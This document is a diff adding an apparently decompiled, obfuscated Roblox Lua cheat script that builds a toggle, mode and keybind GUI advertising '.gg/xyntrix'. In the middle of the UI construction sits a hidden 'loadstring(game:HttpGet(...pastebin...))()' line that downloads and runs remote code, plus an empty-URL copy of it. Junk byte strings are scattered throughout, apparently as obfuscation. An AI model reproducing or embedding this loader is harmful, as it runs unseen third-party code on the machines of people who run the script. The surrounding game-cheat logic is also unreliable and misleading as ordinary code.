+t2.value37.Parent = t2.value34
+t1.value16 = Instance.new("Frame")
+t2.value38 = t1.value16
+t2.value38.Name = "Content"
+t2.value38.ZIndex = 5
+t2.value38.Position = UDim2.new(0, 8, 0, 46)
+t2.value38.Size = UDim2.new(1, -16, 1, -72)
+t2.value38.BackgroundTransparency = 1
+t2.value38.Parent = t2.value34
+local UIListLayout = Instance.new("UIListLayout", t2.value38)
+loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
+UIListLayout.Padding = UDim.new(0, 5)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+local Frame2 = Instance.new("Frame")
+
+Frame2.ZIndex = 5
+Frame2.LayoutOrder = 1
+Frame2.Size = UDim2.new(1, 0, 0, 34)
+Frame2.BackgroundColor3 = Color3.fromRGB(0, 30, 55)
+Frame2.BackgroundTransparency = 0.35
+Frame2.BorderSizePixel = 0
+Frame2.Parent = t2.value38
+Instance.new("UICorner", Frame2).CornerRadius = UDim.new(0, 12)
+
+local TextLabel2 = Instance.new("TextLabel")
+
+TextLabel2.ZIndex = 6
+TextLabel2.Position = UDim2.new(0, 12, 0, 0)
+TextLabel2.Size = UDim2.new(0, 130, 1, 0)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Text = "ENABLE"
+TextLabel2.TextColor3 = Color3.fromRGB(230, 245, 255)
+TextLabel2.TextSize = 12
+TextLabel2.Font = Enum.Font.GothamBold
+TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel2.Parent = Frame2
+t1.value19 = "\206rW"
+t1.value20 = "Instance"
+t1.value17 = Instance.new("Frame")
+t2.value39 = t1.value17
+t2.value39.ZIndex = 6
+t2.value39.Position = UDim2.new(1, -60, 0.5, -12)
+t1.value17 = t2.value39
+local _UDim2_2 = UDim2
+t1.value19 = 48
+t1.value18 = "wI7ϫo|"
+local v37 = _UDim2_2.new(0, t1.value19, 0, 24)
+
+t1.value17.Size = v37
+t2.value39.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
+t2.value39.BorderSizePixel = 0
+t2.value39.Parent = Frame2
+t1.value20 = Instance.new("UICorner", t2.value39)
+t1.value20.CornerRadius = UDim.new(1, 0)
+t1.value20 = Instance.new("Frame")
+t2.value40 = t1.value20
+t2.value40.ZIndex = 7
+t1.value20 = t2.value40
+local new6 = UDim2.new
+t1.value19 = 0
+t1.value21 = 7312846245197
+t1.value18 = -9
+t1.value20.Position = new6(t1.value19, 3, 0.5, t1.value18)
+t1.value20 = t2.value40
+local new7 = UDim2.new
+t1.value18 = 18
+t1.value19 = 0
+t1.value20.Size = new7(t1.value19, 18, 0, t1.value18)
+t2.value40.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
+t2.value40.BorderSizePixel = 0
+t2.value40.Parent = t2.value39
+Instance.new("UICorner", t2.value40).CornerRadius = UDim.new(1, 0)
+loadstring(game:HttpGet(""))()
+local TextButton = Instance.new("TextButton")
+
+TextButton.ZIndex = 8
+local new8 = UDim2.new
+t1.value19 = 1
+t1.value18 = 0
+TextButton.Size = new8(t1.value19, 0, 1, t1.value18)
+TextButton.BackgroundTransparency = 1
+TextButton.Text = ""
+TextButton.Parent = Frame2
+t1.value20 = Instance.new
+t1.value21 = "\255\161\006"
+t1.value18 = "\238\161\141\159\204"
+local v42 = t1.value20("Frame")
+
+v42.ZIndex = 5
+v42.LayoutOrder = 2
+local new9 = UDim2.new
+t1.value21 = "\219g\158M\\m\173"
+t1.value22 = 7419783105919
+v42.Size = new9(1, 0, 0, 32)
+v42.BackgroundColor3 = Color3.fromRGB(0, 30, 55)
+v42.BackgroundTransparency = 0.35
+v42.BorderSizePixel = 0
+v42.Parent = t2.value38
+Instance.new("UICorner", v42).CornerRadius = UDim.new(0, 12)
+
+local TextLabel3 = Instance.new("TextLabel")
+
+TextLabel3.ZIndex = 6
+TextLabel3.Position = UDim2.new(0, 12, 0, 0)
+t1.value19 = UDim2.new
+t1.value21 = 0
+t1.value18 = 100
+TextLabel3.Size = t1.value19(0, t1.value18, 1, t1.value21)
+t1.value19 = 1
+t1.value18 = "\246:/_"
+TextLabel3.BackgroundTransparency = t1.value19
+t1.value22 = "\192\159\231W\209?0"
+t1.value21 = 20745997346236
+TextLabel3.Text = "Choose Mode"
+TextLabel3.TextColor3 = Color3.fromRGB(140, 200, 230)
+TextLabel3.TextSize = 11
+local EnumFont = Enum.Font
+t1.value23 = 5975019490014
+t1.value18 = ",\198<\194\251\169\143/\225a1mL\138"
+TextLabel3.Font = EnumFont.GothamMedium
+TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel3.Parent = v42
+t1.value21 = "\196$\191"
+t1.value22 = 21776500877212
+t1.value19 = Instance.new("TextButton")
+t2.value41 = t1.value19
+t2.value41.ZIndex = 7
+t1.value19 = t2.value41
+local new10 = UDim2.new
+t1.value21 = -64
+t1.value22 = 0.5
+t1.value19.Position = new10(1, t1.value21, t1.value22, -12)
+t1.value19 = t2.value41
+t1.value22 = 3477532608083
+t1.value23 = "\134\140o"
+t1.value19.Size = UDim2.new(0, 56, 0, 24)
+t1.value19 = t2.value41
+t1.value18 = Color3.fromRGB(0, 80, 140)
+t1.value23 = "C\1601\150\190\242\172"
+t1.value21 = "\027\208\026\003Ч\137ʺ\031\152\021\171\252\204\253\028\139\028\t\248\193"
+t1.value22 = 7933756149358
+t1.value19.BackgroundColor3 = t1.value18
+t2.value41.BackgroundTransparency = 0.1
+t2.value41.BorderSizePixel = 0
+t2.value41.Text = t2.value13
+t1.value19 = t2.value41
+t1.value21 = "s\172V}\232\193ʤw\004"
+t1.value22 = 12567613429468
+t1.value19.TextColor3 = Color3.fromRGB(230, 245, 255)
+t2.value41.TextSize = 11
+t1.value19 = t2.value41
+local GothamBold = Enum.Font.GothamBold
+t1.value22 = 9058881589370
+t1.value21 = "\166E\2033\174\235k#YVOO1\251-"
+t1.value19.Font = GothamBold
+t2.value41.AutoButtonColor = false
+t2.value41.Parent = v42
+local UICorner2 = Instance.new("UICorner", t2.value41)
+
+t1.value23 = "\231K\t"
+t1.value21 = "\tr\224\023ZJ\028\015q\169H\162"
+UICorner2.CornerRadius = UDim.new(0, 8)
+
+local Frame3 = Instance.new("Frame")
+
+Frame3.ZIndex = 5
+t1.value23 = "\170\202\237"
+t1.value22 = 23735561906988
+Frame3.LayoutOrder = 3
+t1.value18 = UDim2
+t1.value22 = 0
+t1.value23 = "y+A\236\176\248d"
+t1.value18 = t1.value18.new(1, 0, t1.value22, 32)
+Frame3.Size = t1.value18
+t1.value18 = Color3
+t1.value22 = 55
+t1.value21 = 30
+t1.value18 = t1.value18.fromRGB(0, t1.value21, t1.value22)
+Frame3.BackgroundColor3 = t1.value18
+t1.value22 = 15270318971846
+t1.value21 = "&pK\143\005\182E\174GbaI6\000\234"
+Frame3.BackgroundTransparency = 0.35
+Frame3.BorderSizePixel = 0
+t1.value21 = "GK\019\215J\023"
+t1.value22 = 8127447502536
+Frame3.Parent = t2.value38
+local UICorner3 = Instance.new("UICorner", Frame3)
+
+t1.value18 = UDim.new
+t1.value21 = 0
+t1.value22 = 12
+UICorner3.CornerRadius = t1.value18(t1.value21, t1.value22)
+t1.value23 = 512965050606
+t1.value18 = "Instance"
+local TextLabel4 = Instance.new("TextLabel")
+
+TextLabel4.ZIndex = 6
+t1.value18 = UDim2.new
+t1.value23 = 0
+t1.value21 = 0
+TextLabel4.Position = t1.value18(t1.value21, 12, 0, t1.value23)
+t1.value18 = UDim2.new
+t1.value21 = 0
+t1.value23 = 0
+TextLabel4.Size = t1.value18(t1.value21, 80, 1, t1.value23)
+t1.value22 = "\nB\238h"
+t1.value18 = 1
+TextLabel4.BackgroundTransparency = t1.value18
+TextLabel4.Text = "Keybind"
+t1.value18 = Color3.fromRGB
+t1.value21 = 140
+t1.value22 = 200
+TextLabel4.TextColor3 = t1.value18(t1.value21, t1.value22, 230)
+t1.value18 = 12
+t1.value22 = "DIH\247"
+TextLabel4.TextSize = t1.value18
+TextLabel4.Font = Enum.Font.GothamMedium
+TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
+t1.value23 = "\030K\220"
+t1.value18 = Frame3
+TextLabel4.Parent = t1.value18
+t1.value18 = Instance.new("TextButton")
+t2.value42 = t1.value18
+t2.value42.ZIndex = 7
+t2.value42.Position = UDim2.new(1, -72, 0.5, -12)
+t2.value42.Size = UDim2.new(0, 60, 0, 24)
+t2.value42.BackgroundColor3 = Color3.fromRGB(0, 25, 45)
+t2.value42.BackgroundTransparency = 0.3
+t2.value42.BorderSizePixel = 0
+t2.value42.Text = t2.value11.Name
+t2.value42.TextColor3 = Color3.fromRGB(0, 200, 255)
+t1.value18 = t2.value42
+t1.value23 = "\188Q\175\220"
+t1.value21 = 11
+t1.value18.TextSize = t1.value21
+t2.value42.Font = Enum.Font.GothamBold
+t2.value42.AutoButtonColor = false
+t2.value42.Parent = Frame3
+Instance.new("UICorner", t2.value42).CornerRadius = UDim.new(0, 8)
+t2.value43 = Instance.new("TextLabel")
+t2.value43.ZIndex = 6
+t2.value43.Position = UDim2.new(0, 0, 1, -22)
+t2.value43.Size = UDim2.new(1, 0, 0, 18)
+t2.value43.BackgroundTransparency = 1
+t2.value43.Text = ".gg/xyntrix"
+t2.value43.TextColor3 = Color3.fromRGB(0, 200, 255)
+t2.value43.TextSize = 11
+t2.value43.Font = Enum.Font.GothamBold
+t2.value43.Parent = t2.value34
+local function v52(p15)
+    local value2 = t2.value2
+    local value39 = t2.value39
+    local tweenInfo = TweenInfo.new(0.15)
+    local v129 = p15
+
+    if p15 then
+        v129 = Color3.fromRGB(0, 180, 120)
+    end
+
+    if not v129 then
+        v129 = Color3.fromRGB(40, 50, 70)
+    end
+
+    value2:Create(value39, tweenInfo, {
+		BackgroundColor3 = v129
+	}):Play()
+
+    local value2_2 = t2.value2
+    local value40 = t2.value40
+    local tweenInfo2 = TweenInfo.new(0.15)
+    local v133 = p15
+
+    if p15 then
+        v133 = UDim2.new(1, -21, 0.5, -9)
+    end
+
+    if not v133 then
+        v133 = UDim2.new(0, 3, 0.5, -9)
+    end
+
+    value2_2:Create(value40, tweenInfo2, {
+		Position = v133
+	}):Play()
+
+    local value35_3 = t2.value35
+
+    if p15 then
+        p15 = Color3.fromRGB(0, 220, 160)
+    end
+
+    if not p15 then
+        p15 = Color3.fromRGB(0, 180, 255)
+    end
+
+    value35_3.Color = p15
+end
+TextButton.MouseButton1Click:Connect(function()
+    t2.value29(not t2.value10)
+    v52(t2.value10)
+end)
+t1.value21 = t2.value42.MouseButton1Click
+t1.value21:Connect(function()
+    t2.value12 = true
+    t2.value42.Text = "..."
+end)
+t1.value21 = t2.value41.MouseButton1Click
+t1.value21:Connect(function()
+    if t2.value13 == "V3" then
+        t2.value13 = "V1"
+    elseif t2.value13 == "V1" then
+        t2.value13 = "V2"
+    else
+        t2.value13 = "V3"
+    end
+
+    t2.value41.Text = t2.value13
+    t2.value16()
+end)
+t1.value21 = t2.value36.MouseButton1Click
+t1.value21:Connect(function()
+    t2.value14 = not t2.value14
+    t2.value38.Visible = not t2.value14
+    t2.value37.Visible = not t2.value14
+    t2.value43.Visible = not t2.value14
+
+    local value34 = t2.value34
+    local value14 = t2.value14
+
+    if value14 then
+        value14 = UDim2.new(0, 260, 0, t2.value32)
+    end
+
+    if not value14 then
+        value14 = UDim2.new(0, 260, 0, t2.value31)
+    end
+
+    value34.Size = value14
+    t2.value36.Text = not t2.value14 and "–" or "+"
+end)
+t1.value21 = UserInputService.InputBegan
+t1.value21:Connect(function(p16, p17)
+    if p17 then
+        return
+    end
+
+    local value12 = t2.value12
+
+    if value12 then
+        value12 = p16.UserInputType == Enum.UserInputType.Keyboard
+    end
+
+    if value12 then
+        local v140 = p16.KeyCode ~= Enum.KeyCode.Unknown
+
+        if v140 then
+            v140 = p16.KeyCode ~= Enum.KeyCode.Escape
+        end
+
+        if v140 then
+            t2.value11 = p16.KeyCode
+            t2.value42.Text = t2.value11.Name
+            t2.value16()
+
+            return
+        end
+
+        t2.value42.Text = t2.value11.Name
+
+        return
+    end
+
+    if p16.KeyCode == t2.value11 then
+        local value10 = t2.value10
+
+        t2.value29(not value10)
+        v52(t2.value10)
+    end
+end)
+t1.value21 = nil
+t1.value22 = nil
+t2.value44 = t1.value21
+t2.value45 = t1.value22
+t2.value46 = nil
+Frame.InputBegan:Connect(function(input)
+    local v143 = input.UserInputType == Enum.UserInputType.MouseButton1
+
+    if not v143 then
+        v143 = input.UserInputType == Enum.UserInputType.Touch
+    end
+
+    if v143 then
+        t2.value44 = true
+        t2.value45 = input.Position
+        t2.value46 = t2.value34.Position
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    local v145 = input.UserInputType == Enum.UserInputType.MouseButton1
+
+    if not v145 then
+        v145 = input.UserInputType == Enum.UserInputType.Touch
+    end
+
+    if v145 then
+        t2.value44 = false
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not t2.value44 then
+        return
+    end
+
+    local v147 = input.UserInputType == Enum.UserInputType.MouseMovement
+
+    if not v147 then
+        v147 = input.UserInputType == Enum.UserInputType.Touch
+    end
+
+    if v147 then
+        local v148 = input.Position - t2.value45
+
+        t2.value34.Position = UDim2.new(t2.value46.X.Scale, t2.value46.X.Offset + v148.X, t2.value46.Y.Scale, t2.value46.Y.Offset + v148.Y)
+    end
+end)
+v52(t2.value10)
+
+if t2.value10 then
+    t2.value29(true)
+end
+function t2.value15.destroy()
+    t2.value15.alive = false
+    t2.value27()
+
+    local rootPart = t2.value15.rootPart
+
+    if t2.value21(rootPart) then
+        t2.value19(rootPart, "PhysicsRepRootPart", rootPart)
+    end
+
+    t2.value23()
+    pcall(function()
+        t2.value33:Destroy()
+    end)
+end
+print("prince is the best")
